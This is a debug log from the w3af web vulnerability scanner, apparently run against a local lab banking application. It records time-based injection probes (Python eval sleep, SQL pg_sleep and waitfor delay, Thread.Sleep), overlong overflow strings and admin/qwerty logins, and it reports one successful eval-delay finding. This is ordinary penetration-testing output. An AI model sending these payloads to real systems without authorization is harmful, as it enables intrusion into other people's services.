[Fr 20 Nov 2015 21:33:27 CET - information] Enabling redos's dependency server_header
[Fr 20 Nov 2015 21:33:27 CET - information] Enabling dav's dependency allowed_methods
[Fr 20 Nov 2015 21:33:29 CET - information] Enabling frontpage's dependency frontpage_version
[Fr 20 Nov 2015 21:33:34 CET - debug] Called w3afCore.start()
[Fr 20 Nov 2015 21:33:34 CET - debug] Enabling _dns_cache()
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ] plugins
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ]     audit file_upload, eval, un_ssl, os_commanding, lfi, sqli, preg_replace, mx_injection, generic, format_string, websocket_hijacking, shell_shock, memcachei, ldapi, buffer_overflow, redos, global_redirect, xpath, cors_origin, htaccess_methods, dav, ssi, csrf, xss, ssl_certificate, xst, blind_sqli, phishing_vector, response_splitting, rfd, rfi, frontpage
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=__import__('time').sleep(3)" returned HTTP code "200" (id=4771,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] (Test id: 140709588559248) 7.54933190346 > 4.56116890907 > 2.82785201073
[Fr 20 Nov 2015 21:50:27 CET - debug] (Test id: 140709588559248) Successfully controlled HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "email" for 3 seconds using <ExactDelay (fmt:__import__('time').sleep(%s), delta:0, mult:1)>, response wait time was: 4.56116890907 seconds.
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4772,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4773,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4774,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:27 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=admin&password=qwerty" returned HTTP code "302" (id=4775,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4776,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgKevkQeYoUIjMKjxITNSdicZrJbUnIGQMBKFHwiyxGaeLknZVQqDwHDDlaFuqboVQxUHZVVzpTZDoWLFDuHrzVYerlPqBuwCeNTnwQJWJWFyJWdzHOgGteBTTeYytqIScHnRaUefWxjdvjDuzqKopwVBaVgpNUeshTNOWfvXRWdGPcqdJpThqtWOIIJfLzhHrVdESWwLdEzGNdUzlPryTvHYuKrlNJVQixIQOfZKaAqZfhNTvnDZigwsgdEPzgmcuQuSeckiKcNMgQPpiVMvgYDbNeIwtzgqyjvOqypppIRwpeLnBetrPowXBAGDvTjGMDnccQIaZczoysMPEXJPcAFYEvtBXVKjkxqCnzAUHZwQphbxtJXbAOlzfDgeXSFpHIvDSFISUzOfFwNtNOUSmymwzPdaCsxHPntUcFwxrkTpJFHzjlzVlWEiBScljfZXPnwGWMPcnyVsgPPUnGWtGm with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4777,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4778,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4779,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxu..." returned HTTP code "200" (id=4780,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxuSVZYljwfABhnmZvUKFrF&u..." returned HTTP code "200" (id=4783,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4782,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4781,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnVCedmbvbbElIoCZLuKGBdWFBmqCTyDkLdequvscpOqXyDmqsyMLPchSkKISuDKXhiYpbLVrOSGNuKSJSiVmjjpneviUYyHmxCftDpiMRQtrghcpBMWoLoGkvIwLTrALDsPHxYruxrsAxkNJTnYsMXpZhGiejBYnBYcdwIDwhCEoXBGYsePvhxaWiPMubMOQaCDWxHRjZZngNQiSfkPWNq with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4784,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=oeaoMJVyKdNoeCzVOUgonxYYLgoUqbLPOnAVSBLeQoFeXMYzTDCImRVSuAJFJQcNhJvVElvTeXWlnVguufeSPpDyyevmXuwuPThjpmFEvQrUkKPyPdYJaZPOLVMakLybPdNiUrzzoxRzkbEqTzsuRFjWYdcbsCiugXtDFUbyrZYKnIjbtZbKdTZMnHXLMPwWghyAoYqMIkLhALfuyAYJRqLzSYDHDsabZjbCQzQKSgwMLSyZqwHtJHZfqdYCuhpdeOXjsdQborRJpbGxabKNjbyoEGFDhbjPpyRVWxFULmKfmwBtpOPFXRJnQUILRZMKiomqTVZXHcBzpibVSKNfRcbQPfZMFyYqcYKwyVlJQyqzKsMdrLtOpNRVBebWwUKzWqOPTJlKfcmQbPIEQgNxwZWykWQImljEpctChOaNOCHsUJRxZPWxjQdJULnAVGGXAuRFSIYFIsdVTARmiWVNgjwxfoIqgNKvDZOkZDGByLURGVNKmtvFHxWOpAESaPzKiBapOLsmXmrdNZAteTGQvVsTxuIIxwdtABEFxWlQDmscaazqBSDNfadalQTVZCOupwinYFofpFmtLAWGWFLBzEDThCyNbkwXdyGrrmSqlxjBdVGiLeXWNCzwCcSKrprXuvFbXwsSVQjmXAuIgMKPgwfhYctPpYllPQaqMxdalUoOptXqUOmixnMmVjlhJfeupGWswzIiJaAGhYPlnKHPLniiwfgiqamqHmrlzqeLjHFMUOEUtkbQyUdVfygUggqNrGoYPaLReczJpEEwfKkjcjSFOZprhiQwpwKOxyihqzSJjLRsxLqIfwUYMiSPqlGLGAQUKPrPQIJGLeHGKBSEGsaXvTZNwVCaslCVtbnFHwbCTdeVDRrRxqQZZSbyISxjYFqeODXFIYDybbnMcdutVpDIzUhLgmrgDdTxdkTyFkKdXgwhVgxVlKcVZgmleEYuTugCbQZKewiKTALJESwaDDtbHaFOrGkVtOcbKWwqvvqXJNnHUklZSIAUbryTlfxGeLlQGCRcCwjXASvrmWmPGbInRcqpnCBbuiVsyISAnKqtOcEwvfkQXPmfDhoURZVIAtqHFBrTAjjphYPPXPjNZPEBVPRKpofqfBuVmwBoOCfAqqgWNxbSKYenvpSLHQkxCPdyaIJldMCciKjeTIJxSepcJNnjUFxLLbyyCcYkkjNmbzjDxnqPdPTJuNlwhdNOFbVNgBQUewedScfCfChmxLzdNmPZNQCLbgzmkYlcJEMWarCjzkAPwCvufENDRaQmToThMjkMizTYbIWxSliYoAIGszZIqsYWilPrRYqLJJuLufPoVRRngKeOCxxJPpzRdKrcszglIeCAfztWPkbpJdCQFwwWDEglaOLDaVlqTILeDDqlkbgVCgIqPgQfQvLGaCxyUyIWjUAZjBFSckVLUBavFbeJhDgDLIHCYzTEdKykptmdlmPAtHmHCGNQdYtbIruuJvUOkjEhWWzkoDNyeZClMetPSvUxoheqZAPiPENXLyWBlnbdXjGibyujKJKpzDOpBmpOlUNOIsZWZIZnufzYGFSoTckYNazMvbhixLsyekQpxgqOVwYlNdhcdbHSlFnHfXzpLULJSngPxhouSKwdiLGKTfqiSxanCSwJDGWLYLIFJgLyiJfrPYpVzHhuzuEWwPcEhApBDGFVLCwtlHfgbyrFHdcuAFgHjyYnRuzSTfpckSTfEsXouPJdfzxzQogdyjHgVygWOBIUHAVQTvcbZfSISvkxTMrrRguGCCecQeiIcboJpuOHhreCDpWOhQUOARwcgUXIQeOPhvcafGtWiALshjNreqSsdwGDVzUnYBQyyXShklHGxhSDSnqbhofaOrwnnIAOswTSAMIxgqInhHYFhUtRebIMsKUYcTNHzNpiiWvjWRGQEZfFXkzJtvfPJgUtlOpYHwmqqsZEoCAHpsWFzCUWGNGAlBWRPAsZpKlHtLGUuBCBGPfCLPpADAGyHUoxEBUyFrMzDuFvGimEWWqfzPVkHznbhPjuvqeyKMaYGwUoTGVHMbFhSynmj with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4785,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=Thread.Sleep%283000%29%3B with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4787,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxuSVZYljwf..." returned HTTP code "200" (id=4786,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgKevkQeYoUIjMKjxITNSdicZrJbUnIGQMBKFHwiyxGaeLknZVQqDwHDDlaFuqboVQxUHZVVzpTZDoWLFDuHrzVYerlPqBuwCeNTnwQJWJWFyJWdzHOgGteBTTeYytqIScHnRaUefWxjdvjDuzqKopwVBaVgpNUeshTNOWfvXRWdGPcqdJpThqtWOIIJfLzhHrVdESWwLdEzGNdUzlPryTvHYuKrlNJVQixIQOfZKaAqZfhNTvnDZigwsgdEPzgmcuQuSeckiKcNMgQPpiVMvgYDbNeIwtzgqyjvOqypppIRwpeLnBetrPowXBAGDvTjGMDnccQIaZczoysMPEXJPcAFYEvtBXVKjkxqCnzAUHZwQphbxtJXbAOlzfDgeXSFpHIvDSFISUzOfFwNtNOUSmymwzPdaCsxHPntUcFwxrkTpJFHzjlzVlWEiBScljfZXPnwGWMPcnyVsgPPUnGWtGm&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4789,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=oeaoMJVyKdNoeCzVOUgonxYYLgoUqbLPOnAVSBLeQoFeXMYzTDCImRVSuAJFJQcNhJvVElvTeXWlnVguufeSPpDyyevmXuwuPThjpmFEvQrUkKPyPdYJaZPOLVMakLybPdNiUrzzoxRzkbEqTzsuRFjWYdcbsCiugXtDFUbyrZYKnIjbtZbKdTZMnHXLMPwWghyAoYqMIkLhALfuyAYJRqLzSYDHDsabZjbCQzQKSgwMLSyZqwHtJHZfqdYCuhpdeOXjsdQborRJpbGxabKNjbyoEGFDhbjPpyRVWxFULmKfmwBtpOPFXRJnQUILRZMKiomqTVZXHcBzpibVSKNfRcbQPfZMFyYqcYKwyVlJQyqzKsMdrLtOpNRVBebWwUKzWqOPTJlKfcmQbPIEQgNxwZWykWQImljEpctChOaNOCHsUJRxZPWxjQdJULnAVGGXAuRFSIYFIsdVTARmiWVNgjwxfoIqgNKvDZOkZDGByLURGVNKmtvFHxWOpAESaPzKiBapOLsmXmrdNZAteTGQvVsTxuIIxwdtABEFxWlQDmscaazqBSDNfadalQTVZCOupwinYFofpFmtLAWGWFLBzEDThCyNbkwXdyGrrmSqlxjBdVGiLeXWNCzwCcSKrprXuvFbXwsSVQjmXAuIgMKPgwfhYctPpYllPQaqMxdalUoOptXqUOmixnMmVjlhJfeupGWswzIiJaAGhYPlnKHPLniiwfgiqamqHmrlzqeLjHFMUOEUtkbQyUdVfygUggqNrGoYPaLReczJpEEwfKkjcjSFOZprhiQwpwKOxyihqzSJjLRsxLqIfwUYMiSPqlGLGAQUKPrPQIJGLeHGKBSEGsaXvTZNwVCaslCVtbnFHwbCTdeVDRrRxqQZZSbyISxjYFqeODXFIYDybbnMcdutVpDIzUhLgmrgDdTxdkTyFkKdXgwhVgxVlKcVZgmleEYuTugCbQZKewiKTALJESwaDDtbHaFOrGkVtOcbKWwqvvqXJNnHUklZSIAUbryTlfxGeLlQGCRcCwjXASvrmWmPGbInRcqpnCBbuiVsyISAnKqtOcEwvfkQXPmfDhoURZVIAtqHFBrTAjjphYPPXPjNZPEBVPRKpofqfBuVmwBoOCfAqqgWNxbSKYenvpSLHQkxCPdyaIJldMCciKjeTIJxSepcJNnjUFxLLbyyCcYkkjNmbzjDxnqPdPTJuNlwhdNOFbVNgBQUewedScfCfChmxLzdNmPZNQCLbgzmkYlcJEMWarCjzkAPwCvufENDRaQmToThMjkMizTYbIWxSliYoAIGszZIqsYWilPrRYqLJJuLufPoVRRngKeOCxxJPpzRdKrcszglIeCAfztWPkbpJdCQFwwWDEglaOLDaVlqTILeDDqlkbgVCgIqPgQfQvLGaCxyUyIWjUAZjBFSckVLUBavFbeJhDgDLIHCYzTEdKykptmdlmPAtHmHCGNQdYtbIruuJvUOkjEhWWzkoDNyeZClMetPSvUxoheqZAPiPENXLyWBlnbdXjGibyujKJKpzDOpBmpOlUNOIsZWZIZnufzYGFSoTckYNazMvbhixLsyekQpxgqOVwYlNdhcdbHSlFnHfXzpLULJSngPxhouSKwdiLGKTfqiSxanCSwJDGWLYLIFJgLyiJfrPYpVzHhuzuEWwPcEhApBDGFVLCwtlHfgbyrFHdcuAFgHjyYnRuzSTfpckSTfEsXouPJdfzxzQogdyjHgVygWOBIUHAVQTvcbZfSISvkxTMrrRguGCCecQeiIcboJpuOHhreCDpWOhQUOARwcgUXIQeOPhvcafGtWiALshjNreqSsdwGDVzUnYBQyyXShklHGxhSDSnqbhofaOrwnnIAOswTSAMIxgqInhHYFhUtRebIMsKUYcTNHzNpiiWvjWRGQEZfFXkzJtvfPJgUtlOpYHwmqqsZEoCAHpsWFzCUWGNGAlBWRPAsZpKlHtLGUuBCBGPfCLPpADAGyHUoxEBUyFrMzDuFvGimEWWqfzPVkHznbhPjuvqeyKMaYGwUoTGVHMbFhSynmj&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4788,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709178516240) 8.33653053045 > 0.373274087906 > 2.74038549662
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxuSVZYljwfABhnmZvUKFrF&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4790,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4791,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709178516240) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "account" for 3 seconds using <ExactDelay (fmt:Thread.Sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.373274087906 seconds.
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnV..." returned HTTP code "200" (id=4792,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4793,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=TXDnAIAfKgClWkWOXUCVqbsfeQpTRUYiwZYVVOiGIAzkCYXGVFdtgjIIJPkMsScDPshYlUJvQcdUfnmlpbuqhqnFIEAhfCxzuLyiIdJifrFXWFUIENDuusmszsNeiBDIKJcumPqNiHhwvZyIjGrfaMmfOyBdFHnERWcyHKbxBJrlPoNFxxqmqQPxKkNVjYkRPJkOjoJoLMKCFDAZWdXoYDNhnRRhFvGhYfsQlOJsWLPRtDhoEuXgGtZbtgEjajRehjQngSCZSWnUicKtrmBcQZWdnkoINPXxhYqtvToTmEympGUKvnBhfenGbSdllTNQrQkdKLFCKUYadOLUTwgkBJYxcorObrxaFVjSUkYmRrvYwUuhiGlucVVvpypThxoKtZkvOBOVJZQtkFkfONWsdQuOhUxbXbYeqVgUOKBYZEOarJqqDFLiWSETdtEsQlbNMSgukPeuWaVZdbnswynDgXDxoYJdwzNKxZYhaLoofXbAWcqyljJxvNlSpNCMCxJVOqvCiaEHWeEhMuIgvlZlTZMcoyXeOzoTFQtcMqzoupcUapFplEFSFLhvbROQaFvfSxdshsSgPMjCvnXfOBRgzAmVyEvJLXGPnLESNgahHMCwAEKnIpDtvCfCKwhRcQEGRaIiWqJFDrZsXhOdkWwZqPFYuXqaJmeRgEVKjuserGSHrHFAUzsxaTpQVcDjVEoHBsZWMmrMrjcOmXPRjUEzgoNoRyUBaRIJqIDwYPJbURmKdxOEQBMprJdQbvRKrQFwatgroJvAwVOxDCLKYMUSQaviYVskWPFXVfQuFQeSneyFhSEYjikXmAfBrlpSotjVSYitpMACooWRONTjHsenDQdRFGfqYZeMsbkuYmbJzvlZBcKHkGHsvYvdefMzPMLSxprIPKveTgZPixIgsbpbOmxrFIhKiKWeTueCXwBPmCoNIXYpXWDyzRaPAHKIAUdoWQzesFJAosiLaJVHrCmwWPJpaBIbOmfjINWmgSoxSLsboAtrXulrZXDfVBlTgKgFD&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4794,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=KbYTpeefTGssYidZAmfFYJBjxacxSNmbhaBOKypMyEzxuSVZYljwfABhnmZvUKFrF with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4796,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4795,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnVCedmbvbbElIoCZLuKGBdWFBmqCTyDkLdequvscpOqXyDmqsyMLPchSkKISuDKXhiYpbLVrOSGNuKSJSiVmjjpneviUYyHmxCftDpiMRQtrghcpBMWoLoGkvIwLTrALDsPHxYruxrsAxkNJTnYsMXpZhGiejBYnBYcdwIDwhCEoXBGYsePvhxaWiPMubMOQaCDWxHRjZZngNQiSfkPWNq&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4798,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnVCedmbvbb..." returned HTTP code "200" (id=4797,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=vxlGONQzivuNzxHSvLqNDtilHdKfDrszUkqihLzUDlDnVCedmbvbbElIoCZLuKGBdWF..." returned HTTP code "200" (id=4799,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=2&trancode=1" or pg_sleep(3) and "1"="1&purpose=any purpo..." returned HTTP code "200" (id=4800,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709591589456) 8.44329067469 > 0.409027814865 > 2.72852325837
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709591589456) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "trancode" for 3 seconds using <ExactDelay (fmt:1" or pg_sleep(%s) and "1"="1, delta:0, mult:1)>, response wait time was: 0.409027814865 seconds.
[Fr 20 Nov 2015 21:50:28 CET - debug] Created 10 mutants for "Method: POST | http://192.168.2.130/InternetBanking/employee.php | URL encoded form: (email, balance, userid)" (post data: 6, query string: 4)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=FIz8lnVojgXNhZp&purpose=any purpose" returned HTTP code "200" (id=4802,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4801,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=admin&password=qwerty" returned HTTP code "302" (id=4803,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4804,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgKevkQeYoUIjMKjxITNSdicZ..." returned HTTP code "200" (id=4805,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgK..." returned HTTP code "200" (id=4806,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4807,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=1&email=oeaoMJVyKdNoeCzVOUgonxYYLgoUqbLPOnAVSBLeQoFeX..." returned HTTP code "200" (id=4808,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=TXDnAIAfKgClWkWOXUCVqbsfeQpTRUYiwZYVVOiGIAzkCYXGVFdtgjIIJPkMsScDPsh..." returned HTTP code "200" (id=4810,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=Thread.Sleep(3000);&userid=1&email=1@2.com" returned HTTP code "200" (id=4811,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=TXDnAIAfKgClWkWOXUCVqbsfeQpTRUYiwZYVVOiGIAzkCYXGVFdtg..." returned HTTP code "200" (id=4809,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709587414480) 7.37633568048 > 0.238554954529 > 2.84707381328
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=CIwYyZ8r&account=1 with data: "balance=300.00&userid=1&email=1@2.com" returned HTTP code "200" (id=4812,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/client.php?action=online with data: "amount=19&receipt=Test01!&trancode=1));waitfor delay '0:0:3'--&purpose=any ..." returned HTTP code "200" (id=4813,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] POST http://192.168.2.130/InternetBanking/employee.php?action=account&account=1 with data: "balance=300.00&userid=xsvqQQkPZidbdPDwhxpoRbWirhKyRRXnYdmnhQNRSHfgKevkQeYoU..." returned HTTP code "200" (id=4814,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:50:28 CET - debug] (Test id: 140709587414480) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/employee.php - parameter "balance" for 3 seconds using <ExactDelay (fmt:Thread.Sleep(%s);, delta:0, mult:1000)>, response wait time was: 0.238554954529 seconds.
